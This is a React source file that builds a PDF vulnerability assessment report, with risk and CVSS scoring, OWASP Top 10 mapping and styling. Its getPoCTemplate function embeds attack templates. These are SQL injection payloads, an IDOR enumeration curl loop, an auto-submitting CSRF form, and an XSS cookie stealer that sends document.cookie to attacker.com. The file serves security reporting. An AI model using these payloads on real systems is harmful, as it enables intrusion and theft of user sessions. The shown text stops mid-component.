'use client';

import React from 'react';
import { Document, Page, Text, View, StyleSheet, Svg, Path, G, Rect } from '@react-pdf/renderer';
import { Vulnerability, Scan } from '@/lib/matrix_api';

// ============================================================================
// TYPES & INTERFACES
// ============================================================================

interface PDFReportProps {
    scan: Scan;
    findings: Vulnerability[];
}

interface OwaspCategory {
    id: string;
    name: string;
    count: number;
    compliance: number;
}

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

// Calculate overall security score (0-100)
const calculateRiskScore = (findings: Vulnerability[]): number => {
    if (findings.length === 0) return 100;

    const weights = { critical: 25, high: 15, medium: 8, low: 3, info: 1 };
    let deductions = 0;

    findings.forEach(f => {
        deductions += weights[f.severity as keyof typeof weights] || 0;
    });

    return Math.max(0, Math.min(100, 100 - deductions));
};

// Determine risk level from severity distribution (NOT score-based)
const getRiskFromSeverity = (findings: Vulnerability[]): { level: string; color: string; score: number } => {
    const critical = findings.filter(f => f.severity === 'critical').length;
    const high = findings.filter(f => f.severity === 'high').length;
    const medium = findings.filter(f => f.severity === 'medium').length;

    if (critical > 0) return { level: 'CRITICAL', color: '#EF4444', score: Math.max(0, 25 - (critical * 10)) };
    if (high > 0) return { level: 'HIGH', color: '#F97316', score: Math.max(30, 60 - (high * 10)) };
    if (medium > 0) return { level: 'MODERATE', color: '#F59E0B', score: Math.max(65, 77 - (medium * 5)) };
    return { level: 'LOW', color: '#4CA686', score: 90 };
};

// Format confidence (handles 0-1 and 0-100 ranges)
const formatConfidence = (value: number | undefined): { value: number; label: string } => {
    if (value === undefined || value === null) return { value: 85, label: '85%' };
    let pct: number;
    if (value <= 1) pct = Math.round(value * 100);
    else if (value > 100) pct = Math.round(value / 100);
    else pct = Math.round(value);

    if (pct === 0) return { value: 0, label: 'Requires Review' };
    if (pct < 25) return { value: pct, label: `${pct}% (Low)` };
    return { value: pct, label: `${pct}%` };
};

// Calculate CVSS v3.1 score based on vulnerability type
interface CVSSResult { score: number; vector: string; rating: string }

const calculateCVSS = (vuln: Vulnerability): CVSSResult => {
    const vulnType = vuln.vulnerability_type.toLowerCase();

    // Default: Network, Low complexity, No privs, No interaction
    let AV = 'N', AC = 'L', PR = 'N', UI = 'N', S = 'U', C = 'H', I = 'H', A = 'N';

    // Adjust metrics based on vulnerability type
    if (vulnType.includes('xss')) {
        UI = 'R'; C = 'L'; I = 'L'; A = 'N';
    } else if (vulnType.includes('sql') || vulnType.includes('injection')) {
        C = 'H'; I = 'H'; A = 'H';
    } else if (vulnType.includes('idor') || vulnType.includes('broken_access')) {
        PR = 'L'; C = 'H'; I = 'H'; A = 'N';
    } else if (vulnType.includes('csrf')) {
        UI = 'R'; C = 'L'; I = 'H'; A = 'N';
    } else if (vulnType.includes('ssrf')) {
        C = 'H'; I = 'L'; A = 'L';
    } else if (vulnType.includes('command')) {
        C = 'H'; I = 'H'; A = 'H';
    } else if (vulnType.includes('sensitive') || vulnType.includes('exposure')) {
        C = 'H'; I = 'N'; A = 'N';
    } else if (vulnType.includes('header') || vulnType.includes('misconfig')) {
        C = 'L'; I = 'L'; A = 'N';
    }

    // Calculate score using CVSS v3.1 formula
    const impact: Record<string, number> = { N: 0.0, L: 0.22, H: 0.56 };
    const iscBase = 1 - ((1 - impact[C]) * (1 - impact[I]) * (1 - impact[A]));
    const impactScore = S === 'U' ? 6.42 * iscBase : 7.52 * (iscBase - 0.029) - 3.25 * Math.pow(iscBase - 0.02, 15);

    const av: Record<string, number> = { N: 0.85, A: 0.62, L: 0.55, P: 0.2 };
    const ac: Record<string, number> = { L: 0.77, H: 0.44 };
    const prU: Record<string, number> = { N: 0.85, L: 0.62, H: 0.27 };
    const ui: Record<string, number> = { N: 0.85, R: 0.62 };

    const exploitability = 8.22 * av[AV] * ac[AC] * prU[PR] * ui[UI];

    let score = impactScore <= 0 ? 0 : Math.min(S === 'U' ? impactScore + exploitability : 1.08 * (impactScore + exploitability), 10.0);
    score = Math.round(score * 10) / 10;

    const vector = `CVSS:3.1/AV:${AV}/AC:${AC}/PR:${PR}/UI:${UI}/S:${S}/C:${C}/I:${I}/A:${A}`;
    const rating = score >= 9.0 ? 'Critical' : score >= 7.0 ? 'High' : score >= 4.0 ? 'Medium' : score >= 0.1 ? 'Low' : 'None';

    return { score, vector, rating };
};

// Get CVSS for display (use backend value or calculate)
const getDisplayCVSS = (vuln: Vulnerability): CVSSResult => {
    if (vuln.cvss_score && vuln.cvss_score > 0) {
        const rating = vuln.cvss_score >= 9.0 ? 'Critical' : vuln.cvss_score >= 7.0 ? 'High' : vuln.cvss_score >= 4.0 ? 'Medium' : 'Low';
        return { score: vuln.cvss_score, vector: '', rating };
    }
    return calculateCVSS(vuln);
};

// Format evidence with better structure
const formatEvidence = (evidence: string | undefined, vuln?: Vulnerability): string => {
    if (!evidence) return 'No evidence captured';

    const endpoint = vuln?.url || 'Unknown';
    const method = vuln?.method || 'GET';
    const param = vuln?.parameter ? `\nPARAMETER: ${vuln.parameter}` : '';

    try {
        const parsed = JSON.parse(evidence);

        // Extract key fields for summary
        const summary: string[] = [];
        if (parsed.status) summary.push(`Status: ${parsed.status}`);
        if (parsed.message) summary.push(`Message: ${parsed.message}`);
        if (parsed.error) summary.push(`Error: ${parsed.error}`);

        // Format the JSON with indentation - limit to 12 lines for compact display
        const formatted = JSON.stringify(parsed, null, 2);
        const lines = formatted.split('\n');
        const truncated = lines.length > 12
            ? lines.slice(0, 12).join('\n') + '\n...[truncated]'
            : formatted;

        const summaryLine = summary.length > 0 ? `\nSUMMARY: ${summary.join(' | ')}\n` : '';
        return `ENDPOINT: ${method} ${endpoint}${param}${summaryLine}\nRESPONSE:\n${truncated}`;
    } catch {
        // Not JSON - format as text
        const cleaned = evidence.replace(/\s+/g, ' ').trim();
        const truncated = cleaned.length > 500 ? cleaned.substring(0, 500) + '...[truncated]' : cleaned;
        return `ENDPOINT: ${method} ${endpoint}${param}\n\nDATA: ${truncated}`;
    }
};

// Get CVSS severity label
const getCVSSSeverity = (score: number | undefined): string => {

    if (!score) return 'N/A';
    if (score >= 9.0) return 'Critical';
    if (score >= 7.0) return 'High';
    if (score >= 4.0) return 'Medium';
    if (score >= 0.1) return 'Low';
    return 'None';
};

// --- CHART HELPERS ---
// Helper for truncating long text
const truncateText = (text: string, maxLength: number) => {
    if (!text) return '';
    return text.length > maxLength ? text.substring(0, maxLength) + '...' : text;
};

const polarToCartesian = (centerX: number, centerY: number, radius: number, angleInDegrees: number) => {
    const angleInRadians = (angleInDegrees - 90) * Math.PI / 180.0;
    return {
        x: centerX + (radius * Math.cos(angleInRadians)),
        y: centerY + (radius * Math.sin(angleInRadians))
    };
};

const describeArc = (x: number, y: number, radius: number, startAngle: number, endAngle: number) => {
    const start = polarToCartesian(x, y, radius, endAngle);
    const end = polarToCartesian(x, y, radius, startAngle);
    const largeArcFlag = endAngle - startAngle <= 180 ? "0" : "1";
    return [
        "M", start.x, start.y,
        "A", radius, radius, 0, largeArcFlag, 0, end.x, end.y,
        "L", x, y,
        "Z"
    ].join(" ");
};

// Get effective severity (use CVSS-based if higher than reported severity)
const getEffectiveSeverity = (vuln: Vulnerability): string => {
    const cvss = getDisplayCVSS(vuln);
    const cvssSeverity = cvss.score >= 9.0 ? 'critical' : cvss.score >= 7.0 ? 'high' : cvss.score >= 4.0 ? 'medium' : cvss.score >= 0.1 ? 'low' : 'info';

    // Severity ranking for comparison
    const severityRank: Record<string, number> = { critical: 5, high: 4, medium: 3, low: 2, info: 1 };

    // Return the higher severity (CVSS-based or reported)
    const reportedRank = severityRank[vuln.severity] || 0;
    const cvssRank = severityRank[cvssSeverity] || 0;

    return cvssRank > reportedRank ? cvssSeverity : vuln.severity;
};

// Map vulnerabilities to OWASP Top 10 with proper inference
const mapToOwasp = (findings: Vulnerability[]): OwaspCategory[] => {
    const owaspMap: Record<string, OwaspCategory> = {
        'A01': { id: 'A01', name: 'Broken Access Control', count: 0, compliance: 100 },
        'A02': { id: 'A02', name: 'Cryptographic Failures', count: 0, compliance: 100 },
        'A03': { id: 'A03', name: 'Injection', count: 0, compliance: 100 },
        'A04': { id: 'A04', name: 'Insecure Design', count: 0, compliance: 100 },
        'A05': { id: 'A05', name: 'Security Misconfiguration', count: 0, compliance: 100 },
        'A06': { id: 'A06', name: 'Vulnerable Components', count: 0, compliance: 100 },
        'A07': { id: 'A07', name: 'Auth Failures', count: 0, compliance: 100 },
        'A08': { id: 'A08', name: 'Data Integrity', count: 0, compliance: 100 },
        'A09': { id: 'A09', name: 'Logging Failures', count: 0, compliance: 100 },
        'A10': { id: 'A10', name: 'SSRF', count: 0, compliance: 100 },
    };

    // Type-to-OWASP mapping
    const typeMap: Record<string, string> = {
        'idor': 'A01', 'broken_access': 'A01', 'privilege': 'A01', 'authorization': 'A01', 'bac': 'A01',
        'crypto': 'A02', 'encryption': 'A02', 'ssl': 'A02', 'tls': 'A02', 'hash': 'A02',
        'sql': 'A03', 'injection': 'A03', 'xss': 'A03', 'command': 'A03', 'ldap': 'A03',
        'business': 'A04', 'design': 'A04', 'logic': 'A04',
        'misconfig': 'A05', 'header': 'A05', 'cors': 'A05', 'csp': 'A05', 'default': 'A05',
        'outdated': 'A06', 'component': 'A06', 'library': 'A06', 'dependency': 'A06',
        'auth': 'A07', 'session': 'A07', 'password': 'A07', 'credential': 'A07', 'brute': 'A07',
        'integrity': 'A08', 'deserialization': 'A08',
        'logging': 'A09', 'monitoring': 'A09', 'audit': 'A09',
        'ssrf': 'A10', 'server_side': 'A10',
    };

    // Infer OWASP category from vulnerability type or explicit category
    const inferCategory = (vulnType: string, explicit?: string): string => {
        if (explicit) {
            // Handle "API1:2023", "API3:2023" format → A01, A03
            const apiMatch = explicit.match(/^API(\d+)/i);
            if (apiMatch) {
                const apiNum = apiMatch[1].padStart(2, '0');
                if (owaspMap[`A${apiNum}`]) return `A${apiNum}`;
            }
            // Handle "A01", "A02" format
            if (owaspMap[explicit.substring(0, 3)]) return explicit.substring(0, 3);
        }
        // Infer from vulnerability type
        const lower = vulnType.toLowerCase();
        for (const [key, cat] of Object.entries(typeMap)) {
            if (lower.includes(key)) return cat;
        }
        return 'A05'; // Default to misconfiguration
    };

    findings.forEach(f => {
        const category = inferCategory(f.vulnerability_type, f.owasp_category);
        if (owaspMap[category]) {
            owaspMap[category].count++;

            // Use EFFECTIVE severity (considers CVSS) for compliance reduction
            const effectiveSeverity = getEffectiveSeverity(f);
            if (effectiveSeverity === 'critical') {
                owaspMap[category].compliance = Math.min(owaspMap[category].compliance, 10);
            } else if (effectiveSeverity === 'high') {
                owaspMap[category].compliance = Math.min(owaspMap[category].compliance, 40);
            } else if (effectiveSeverity === 'medium') {
                owaspMap[category].compliance = Math.min(owaspMap[category].compliance, 70);
            } else if (effectiveSeverity === 'low') {
                owaspMap[category].compliance = Math.min(owaspMap[category].compliance, 85);
            }
        }
    });

    return Object.values(owaspMap);
};


// Generate PoC code with authentication
const getPoCTemplate = (vuln: Vulnerability): string => {
    const url = vuln.url || 'http://target.com';
    const param = vuln.parameter || 'id';
    const method = vuln.method || 'GET';

    if (vuln.vulnerability_type.includes('sql') || vuln.vulnerability_type.includes('injection')) {
        return `#!/usr/bin/env python3
# SQL Injection PoC - ${vuln.title}
import requests

TARGET = "${url}"
SESSION = requests.Session()

# Authentication (replace with valid credentials)
AUTH_HEADERS = {
    "Authorization": "Bearer <YOUR_JWT_TOKEN>",
    "Cookie": "session=<SESSION_COOKIE>"
}

PAYLOADS = [
    "' OR '1'='1",
    "1 UNION SELECT null,username,password FROM users--",
    "1'; WAITFOR DELAY '0:0:5'--"
]

for payload in PAYLOADS:
    resp = SESSION.${method.toLowerCase()}(TARGET, 
        headers=AUTH_HEADERS,
        params={"${param}": payload})
    print(f"[{resp.status_code}] {payload[:30]}...")`;
    }

    if (vuln.vulnerability_type.includes('xss')) {
        return `// XSS Proof of Concept - ${vuln.title}
// Requires: Valid session in browser

// Step 1: Test payload
const payload = '<img src=x onerror="alert(document.domain)">';
const testUrl = '${url}?${param}=' + encodeURIComponent(payload);
console.log('Test URL:', testUrl);

// Step 2: Cookie stealer (for demonstration)
const stealerPayload = \`<script>
  new Image().src='https://attacker.com/log?c='+document.cookie;
</script>\`;

// Step 3: Verify with fetch
fetch(testUrl, {
    credentials: 'include'  // Include cookies
}).then(r => r.text()).then(console.log);`;
    }

    if (vuln.vulnerability_type.includes('idor') || vuln.vulnerability_type.includes('object')) {
        return `#!/bin/bash
# IDOR Exploitation PoC - ${vuln.title}

TARGET="${url}"
AUTH_TOKEN="Bearer <YOUR_JWT_TOKEN>"
COOKIE="session=<SESSION_ID>"

echo "[*] Testing IDOR on ${param} parameter..."

for id in {1..20}; do
    response=$(curl -s "${method === 'POST' ? '-X POST' : ''}" "$TARGET" \\
        -H "Authorization: $AUTH_TOKEN" \\
        -H "Cookie: $COOKIE" \\
        ${method === 'GET' ? `--data-urlencode "${param}=$id"` : `-d '{"${param}": '$id'}'`})
    
    if echo "$response" | grep -q "email\\|password\\|user"; then
        echo "[+] ID $id: Sensitive data exposed!"
    fi
done`;
    }

    if (vuln.vulnerability_type.includes('csrf')) {
        return `<!-- CSRF PoC - ${vuln.title} -->
<html>
<body>
<h1>Click to win a prize!</h1>
<form id="csrf" action="${url}" method="${method}">
    <input type="hidden" name="${param}" value="attacker_value"/>
    <input type="hidden" name="amount" value="10000"/>
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>`;
    }

    return `# PoC for ${vuln.vulnerability_type.replace(/_/g, ' ')}
# Target: ${url}
# Method: ${method}
# Parameter: ${param}

# Add authentication headers:
curl -X ${method} "${url}" \\
    -H "Authorization: Bearer <TOKEN>" \\
    -H "Cookie: session=<SESSION>"`;
};


// ============================================================================
// STYLES
// ============================================================================

const colors = {
    background: '#121212',      // Pitch black
    surface: '#1A1A1A',         // Dark grey surface
    surfaceLight: '#222222',    // Slightly lighter grey
    border: '#333333',          // Grey border
    text: '#E0E0E0',            // Light grey text
    textMuted: '#888888',       // Muted grey
    accent: '#4CA686',          // Matrix green
    critical: '#EF4444',        // Red
    high: '#F97316',            // Orange
    medium: '#F59E0B',          // Amber
    low: '#3B82F6',             // Blue
    info: '#6B7280',            // Grey
    success: '#4CA686',         // Green
};

const styles = StyleSheet.create({
    // Page
    page: {
        backgroundColor: colors.background,
        color: colors.text,
        fontFamily: 'Helvetica',
        padding: 45,
        paddingBottom: 80,
        fontSize: 10,
    },

    // Cover Page
    coverPage: {
        backgroundColor: colors.background,
        padding: 50,
        justifyContent: 'center',
        alignItems: 'center',
        height: '100%',
    },
    coverTitle: {
        fontSize: 52,
        fontFamily: 'Times-Bold',
        color: colors.text,
        letterSpacing: 8,
        marginBottom: 12,
    },
    coverSubtitle: {
        fontSize: 11,
        fontFamily: 'Helvetica',
        color: colors.accent,
        letterSpacing: 8,
        marginBottom: 60,
        textTransform: 'uppercase',
    },
    coverMeta: {
        backgroundColor: colors.surface,
        padding: 30,
        borderRadius: 8,
        width: '80%',
        marginTop: 40,
    },
    coverMetaRow: {
        flexDirection: 'row',
        justifyContent: 'space-between',
        marginBottom: 12,
        paddingBottom: 12,
        borderBottomWidth: 1,
        borderBottomColor: colors.border,
    },
    coverLabel: {
        fontSize: 9,
        fontFamily: 'Helvetica',
        color: colors.textMuted,
        textTransform: 'uppercase',
        letterSpacing: 1,
    },
    coverValue: {
        fontSize: 11,
        fontFamily: 'Helvetica-Bold',
        color: colors.text,
    },

    // Headers
    header: {
        flexDirection: 'row',
        justifyContent: 'space-between',
        alignItems: 'center',
        borderBottomWidth: 2,
        borderBottomColor: colors.accent,
        paddingBottom: 15,
        marginBottom: 25,
    },
    headerTitle: {
        fontSize: 20,
        fontFamily: 'Times-Bold',
        color: colors.text,
        letterSpacing: 1,
    },
    headerMeta: {
        fontSize: 9,
        fontFamily: 'Courier',
        color: colors.textMuted,
    },

    // Section Titles
    sectionTitle: {
        fontSize: 13,
        fontFamily: 'Times-Bold',
        color: colors.accent,
        textTransform: 'uppercase',
        borderLeftWidth: 4,
        borderLeftColor: colors.accent,
        paddingLeft: 14,
        marginBottom: 22,
        marginTop: 28,
        letterSpacing: 2,
    },

    // Executive Summary
    scoreContainer: {
        flexDirection: 'row',
        gap: 20,
        marginBottom: 30,
    },
    scoreCard: {
        flex: 1,
        backgroundColor: colors.surface,
        padding: 25,
        borderRadius: 8,
        alignItems: 'center',
        borderWidth: 1,
        borderColor: colors.border,
    },
    scoreValue: {
        fontSize: 48,
        fontFamily: 'Helvetica-Bold',
    },
    scoreLabel: {
        fontSize: 10,
        color: colors.textMuted,
        marginTop: 8,
        textTransform: 'uppercase',
    },
    statsCard: {
        flex: 2,
        backgroundColor: colors.surface,
        padding: 20,
        borderRadius: 8,
        borderWidth: 1,
        borderColor: colors.border,
    },
    statRow: {
        flexDirection: 'row',
        justifyContent: 'space-between',
        alignItems: 'center',
        paddingVertical: 8,
        borderBottomWidth: 1,
        borderBottomColor: colors.border,
    },

    // Scan Details
    detailsGrid: {
        flexDirection: 'row',
        flexWrap: 'wrap',
        gap: 12,
        marginBottom: 25,
    },
    detailCard: {
        backgroundColor: colors.surface,
        padding: 15,
        borderRadius: 6,
        flex: 1,
        minWidth: '30%',
        borderWidth: 1,
        borderColor: colors.border,
    },
    detailLabel: {
        fontSize: 8,
        color: colors.textMuted,
        textTransform: 'uppercase',
        marginBottom: 4,
    },
    detailValue: {
        fontSize: 11,
        color: colors.text,
    },

    // OWASP Compliance
    owaspRow: {
        flexDirection: 'row',
        alignItems: 'center',
        marginBottom: 8,
        backgroundColor: colors.surface,
        padding: 10,
        borderRadius: 4,
    },
    owaspLabel: {
        width: 220,
        fontSize: 9,
        color: colors.text,
    },
    owaspBar: {
        flex: 1,
        height: 8,
        backgroundColor: colors.surfaceLight,
        borderRadius: 4,
        marginHorizontal: 10,
    },
    owaspFill: {
        height: 8,
        borderRadius: 4,
    },
    owaspValue: {
        width: 40,
        fontSize: 9,
        textAlign: 'right',
    },

    // Finding Card
    findingCard: {
        marginBottom: 20,
        backgroundColor: colors.surface,
        borderRadius: 8,
        borderWidth: 1,
        borderColor: colors.border,
        overflow: 'hidden',
    },
    findingHeader: {
        backgroundColor: colors.surfaceLight,
        padding: 12,
        flexDirection: 'row',
        justifyContent: 'space-between',
        alignItems: 'center',
        borderBottomWidth: 1,
        borderBottomColor: colors.border,
    },
    findingId: {
        fontSize: 8,
        color: colors.textMuted,
        marginBottom: 4,
    },
    findingTitle: {
        fontSize: 13,
        fontFamily: 'Helvetica-Bold',
        color: colors.text,
    },
    severityBadge: {
        paddingHorizontal: 10,
        paddingVertical: 5,
        borderRadius: 4,
    },
    cvssBadge: {
        backgroundColor: colors.border,
        paddingHorizontal: 8,
        paddingVertical: 4,
        borderRadius: 4,
        marginLeft: 8,
    },
    findingBody: {
        padding: 12,
    },
    metaGrid: {
        flexDirection: 'row',
        gap: 20,
        marginBottom: 20,
        paddingBottom: 15,
        borderBottomWidth: 1,
        borderBottomColor: colors.border,
    },
    metaItem: {
        flex: 1,
    },
    metaLabel: {
        fontSize: 8,
        color: colors.textMuted,
        textTransform: 'uppercase',
        marginBottom: 4,
    },
    metaValue: {
        fontSize: 10,
        color: colors.text,
    },

    // Content Sections
    sectionLabel: {
        fontSize: 9,
        color: colors.accent,
        textTransform: 'uppercase',
        marginBottom: 8,
        marginTop: 15,
    },
    descText: {
        fontSize: 10,
        color: colors.textMuted,
        lineHeight: 1.6,
    },
    codeBlock: {
        backgroundColor: '#000000',
        padding: 12,
        borderRadius: 4,
        marginTop: 6,
    },
    codeText: {
        fontFamily: 'Courier',
        fontSize: 8,
        color: '#A5D6A7',
        lineHeight: 1.4,
    },
    pocBlock: {
        backgroundColor: '#161616',
        padding: 8,
        borderRadius: 4,
        borderLeftWidth: 2,
        borderLeftColor: colors.critical,
        marginTop: 6,
        marginBottom: 10,
    },
    pocText: {
        fontFamily: 'Courier',
        fontSize: 7,
        color: '#E57373',
        lineHeight: 1.3,
    },
    remediationBlock: {
        backgroundColor: '#0D2B15',
        padding: 12,
        borderRadius: 4,
        borderLeftWidth: 3,
        borderLeftColor: '#43A047',
        marginTop: 10,
    },

    // Footer
    footer: {
        position: 'absolute',
        bottom: 30,
        left: 40,
        right: 40,
        flexDirection: 'row',
        justifyContent: 'space-between',
        borderTopWidth: 1,
        borderTopColor: colors.border,
        paddingTop: 10,
    },
    footerText: {
        fontSize: 8,
        color: colors.textMuted,
    },

    // Severity Legend
    legendContainer: {
        backgroundColor: colors.surface,
        padding: 15,
        borderRadius: 8,
        marginTop: 20,
        borderWidth: 1,
        borderColor: colors.border,
    },
    legendTitle: {
        fontSize: 10,
        fontFamily: 'Helvetica-Bold',
        color: colors.text,
        marginBottom: 12,
    },
    legendRow: {
        flexDirection: 'row',
        alignItems: 'center',
        marginBottom: 8,
    },
    legendDot: {
        width: 10,
        height: 10,
        borderRadius: 5,
        marginRight: 10,
    },
    legendLabel: {
        fontSize: 9,
        fontFamily: 'Helvetica-Bold',
        width: 60,
        color: colors.text,
    },
    legendDesc: {
        fontSize: 8,
        color: colors.textMuted,
        flex: 1,
    },

    // Section Divider
    sectionDivider: {
        height: 3,
        marginVertical: 25,
        borderRadius: 2,
    },

    // Stats Grid
    statsGrid: {
        flexDirection: 'row',
        flexWrap: 'wrap',
        gap: 10,
        marginBottom: 20,
    },
    statBox: {
        flex: 1,
        minWidth: '22%',
        backgroundColor: colors.surface,
        padding: 15,
        borderRadius: 6,
        alignItems: 'center',
        borderLeftWidth: 4,
    },
    statNumber: {
        fontSize: 28,
        fontFamily: 'Helvetica-Bold',
        marginBottom: 4,
    },
    statLabel: {
        fontSize: 8,
        color: colors.textMuted,
        textTransform: 'uppercase',
    },
});

// ============================================================================
// MAIN COMPONENT
// ============================================================================

export const PDFReport: React.FC<PDFReportProps> = ({ scan, findings }) => {
    const activeFindings = findings.filter(f => !f.is_suppressed);
    const riskData = getRiskFromSeverity(activeFindings);
    const owaspCompliance = mapToOwasp(activeFindings);

    // Severity counts
    const counts = {
        critical: activeFindings.filter(f => f.severity === 'critical').length,
        high: activeFindings.filter(f => f.severity === 'high').length,
        medium: activeFindings.filter(f => f.severity === 'medium').length,
        low: activeFindings.filter(f => f.severity === 'low').length,
        info: activeFindings.filter(f => f.severity === 'info').length,
    };

    // Category aggregation for Bar Chart
    const categoryCounts: Record<string, number> = {};
    activeFindings.forEach(f => {
        const cat = f.owasp_category || f.vulnerability_type?.replace(/_/g, ' ') || 'Uncategorized';
        categoryCounts[cat] = (categoryCounts[cat] || 0) + 1;
    });
    const sortedCategories = Object.entries(categoryCounts)
        .sort((a, b) => b[1] - a[1])
        .slice(0, 5)
        .map(([name, count]) => ({ name, count }));

    // Pie Chart Data Prep
    const totalFindings = activeFindings.length > 0 ? activeFindings.length : 1;
    let currentAngle = 0;
    const pieData = [
        { key: 'critical', count: counts.critical, color: colors.critical },
        { key: 'high', count: counts.high, color: colors.high },
        { key: 'medium', count: counts.medium, color: colors.medium },
        { key: 'low', count: counts.low + counts.info, color: colors.low } // Group Low+Info
    ].filter(d => d.count > 0).map(d => {
        const angle = (d.count / totalFindings) * 360;
        const start = currentAngle;
        const end = currentAngle + angle;
        currentAngle += angle;
        // Adjust for full circle/single item
        const isFull = d.count === totalFindings;
        return { ...d, start, end, isFull };
    });

    return (
        <Document>
            {/* ============================================================ */}
            {/* PAGE 1: COVER PAGE                                          */}
            {/* ============================================================ */}
            <Page size="A4" style={styles.page}>
                <View style={{ flex: 1, justifyContent: 'center', alignItems: 'center' }}>
                    <Text style={styles.coverTitle}>MATRIX</Text>
                    <Text style={styles.coverSubtitle}>SECURITY ASSESSMENT REPORT</Text>

                    <View style={styles.coverMeta}>
                        <View style={styles.coverMetaRow}>
                            <Text style={styles.coverLabel}>Target System</Text>
                            <Text style={styles.coverValue}>{scan.target_url}</Text>
                        </View>
                        <View style={styles.coverMetaRow}>
                            <Text style={styles.coverLabel}>Report ID</Text>
                            <Text style={styles.coverValue}>MTX-{String(scan.id).padStart(4, '0')}</Text>
                        </View>
                        <View style={styles.coverMetaRow}>
                            <Text style={styles.coverLabel}>Scan Date</Text>
                            <Text style={styles.coverValue}>{new Date(scan.created_at).toLocaleDateString()}</Text>
                        </View>
                        <View style={styles.coverMetaRow}>
                            <Text style={styles.coverLabel}>Report Date</Text>
                            <Text style={styles.coverValue}>{new Date().toLocaleDateString()}</Text>
                        </View>
                        <View style={[styles.coverMetaRow, { borderBottomWidth: 0 }]}>
                            <Text style={styles.coverLabel}>Classification</Text>
                            <Text style={[styles.coverValue, { color: colors.critical }]}>CONFIDENTIAL</Text>
                        </View>
                    </View>

                    <View style={{ marginTop: 60, alignItems: 'center' }}>
                        <Text style={{ fontSize: 12, color: colors.textMuted }}>Prepared By</Text>
                        <Text style={{ fontSize: 14, color: colors.text, marginTop: 8 }}>Matrix Cyber Intelligence Platform</Text>
                    </View>
                </View>

                <View style={styles.footer} fixed>
                    <Text style={styles.footerText}>© Matrix Security</Text>
                    <Text style={styles.footerText} render={({ pageNumber, totalPages }) =>
                        `Page ${pageNumber} of ${totalPages}`
                    } />
                </View>
            </Page>

            {/* ============================================================ */}
            {/* PAGE 2: EXECUTIVE SUMMARY                                   */}
            {/* ============================================================ */}
            <Page size="A4" style={styles.page}>
                <View style={styles.header}>
                    <Text style={styles.headerTitle}>Executive Summary</Text>
                    <Text style={styles.headerMeta}>MTX-{String(scan.id).padStart(4, '0')}</Text>
                </View>

                {/* Risk Score & Stats */}
                <View style={styles.scoreContainer}>
                    <View style={styles.scoreCard}>
                        <Text style={[styles.scoreValue, { color: riskData.color }]}>{riskData.score}</Text>
                        <Text style={styles.scoreLabel}>Security Score</Text>
                        <Text style={{ fontSize: 12, color: riskData.color, marginTop: 8, fontFamily: 'Helvetica-Bold' }}>
                            {riskData.level} RISK
                        </Text>
                    </View>

                    <View style={{ flex: 2 }}>
                        <Text style={{ fontSize: 11, color: colors.text, marginBottom: 12, fontFamily: 'Helvetica-Bold' }}>
                            Vulnerability Distribution
                        </Text>
                        <View style={styles.statsGrid}>
                            <View style={[styles.statBox, { borderLeftColor: colors.critical }]}>
                                <Text style={[styles.statNumber, { color: colors.critical }]}>{counts.critical}</Text>
                                <Text style={styles.statLabel}>Critical</Text>
                            </View>
                            <View style={[styles.statBox, { borderLeftColor: colors.high }]}>
                                <Text style={[styles.statNumber, { color: colors.high }]}>{counts.high}</Text>
                                <Text style={styles.statLabel}>High</Text>
                            </View>
                            <View style={[styles.statBox, { borderLeftColor: colors.medium }]}>
                                <Text style={[styles.statNumber, { color: colors.medium }]}>{counts.medium}</Text>
                                <Text style={styles.statLabel}>Medium</Text>
                            </View>
                            <View style={[styles.statBox, { borderLeftColor: colors.low }]}>
                                <Text style={[styles.statNumber, { color: colors.low }]}>{counts.low + counts.info}</Text>
                                <Text style={styles.statLabel}>Low/Info</Text>
                            </View>
                        </View>
                    </View>
                </View>

                {/* Scan Details */}
                <Text style={styles.sectionTitle}>Assessment Details</Text>
                <View style={styles.detailsGrid}>
                    <View style={styles.detailCard}>
                        <Text style={styles.detailLabel}>Target URL</Text>
                        <Text style={styles.detailValue}>{scan.target_url}</Text>
                    </View>
                    <View style={styles.detailCard}>
                        <Text style={styles.detailLabel}>Scan Type</Text>
                        <Text style={styles.detailValue}>{scan.scan_type || 'Deep Audit'}</Text>
                    </View>
                    <View style={styles.detailCard}>
                        <Text style={styles.detailLabel}>Total Findings</Text>
                        <Text style={styles.detailValue}>{activeFindings.length}</Text>
                    </View>
                </View>

                {scan.technology_stack && scan.technology_stack.length > 0 && (
                    <View style={[styles.detailCard, { marginBottom: 25 }]}>
                        <Text style={styles.detailLabel}>Technology Stack</Text>
                        <Text style={styles.detailValue}>{scan.technology_stack.join(' • ')}</Text>
                    </View>
                )}

                {/* OWASP Compliance */}
                <Text style={styles.sectionTitle}>OWASP Top 10 Compliance</Text>
                {owaspCompliance.slice(0, 6).map((cat) => (
                    <View key={cat.id} style={styles.owaspRow}>
                        <Text style={styles.owaspLabel}>{cat.id}: {cat.name}</Text>
                        <View style={styles.owaspBar}>
                            <View style={[styles.owaspFill, {
                                width: `${cat.compliance}%`,
                                backgroundColor: cat.compliance >= 80 ? colors.low : cat.compliance >= 50 ? colors.medium : colors.critical
                            }]} />
                        </View>
                        <Text style={[styles.owaspValue, {
                            color: cat.compliance >= 80 ? colors.low : cat.compliance >= 50 ? colors.medium : colors.critical
                        }]}>{cat.compliance}%</Text>
                    </View>
                ))}

                {/* Color-Coded Section Divider */}
                <View style={[styles.sectionDivider, {
                    backgroundColor: riskData.color,
                    opacity: 0.6
                }]} />

                {/* Severity Legend */}
                <View style={styles.legendContainer}>
                    <Text style={styles.legendTitle}>Severity Classification Guide</Text>
                    <View style={styles.legendRow}>
                        <View style={[styles.legendDot, { backgroundColor: colors.critical }]} />
                        <Text style={[styles.legendLabel, { color: colors.critical }]}>Critical</Text>
                        <Text style={styles.legendDesc}>Proven exploitable with verified attack chain</Text>
                    </View>
                    <View style={styles.legendRow}>
                        <View style={[styles.legendDot, { backgroundColor: colors.high }]} />
                        <Text style={[styles.legendLabel, { color: colors.high }]}>High</Text>
                        <Text style={styles.legendDesc}>Directly exploitable with significant impact</Text>
                    </View>
                    <View style={styles.legendRow}>
                        <View style={[styles.legendDot, { backgroundColor: colors.medium }]} />
                        <Text style={[styles.legendLabel, { color: colors.medium }]}>Medium</Text>
                        <Text style={styles.legendDesc}>Exploitable under specific conditions</Text>
                    </View>
                    <View style={styles.legendRow}>
                        <View style={[styles.legendDot, { backgroundColor: colors.low }]} />
                        <Text style={[styles.legendLabel, { color: colors.low }]}>Low</Text>
                        <Text style={styles.legendDesc}>Limited impact or difficult to exploit</Text>
